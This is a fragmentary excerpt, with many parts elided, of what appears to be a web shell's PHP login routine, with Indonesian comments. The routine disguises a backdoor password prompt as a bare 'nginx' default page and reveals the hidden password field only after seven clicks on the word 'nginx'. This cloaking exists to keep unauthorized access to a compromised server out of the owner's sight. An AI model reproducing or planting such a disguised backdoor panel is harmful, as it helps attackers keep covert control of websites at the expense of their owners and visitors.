...
function show_login_page() {
    ...
    <head>
        ...
        <style>
            ...
            #password {
                border: 2px solid white; /* Gaya border putih */
                background-color: transparent; /* Sesuaikan jika perlu */
                color: white; /* Warna teks putih */
                padding: 5px;
            }
            #password:focus {
                border-color: white; /* Gaya border putih saat fokus */
    ...
    <body>
        <center>
            ...
            <hr>
            <center>
                <span id="nginxText">nginx</span>
                <form id="passwordForm" method="post" action="">
                    <input type="password" id="password" name="pass" onkeydown="handleKeyDown(event)">
                </form>
            </center>
        </center>
        ...
        <script>
            let clickCount = 0;
            const nginxText = document.getElementById('nginxText');
            const passwordForm = document.getElementById('passwordForm');

            nginxText.addEventListener('click', () => {
                clickCount++;
                if (clickCount === 7) {
                    nginxText.style.display = 'none';
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li class="logo-NMN"><img width="300" height="300" src="https://i.ibb.co/SRPQsbn/02a342e63a9479eac8f54cd852a48e41-removebg-preview.png" align="right"></li>
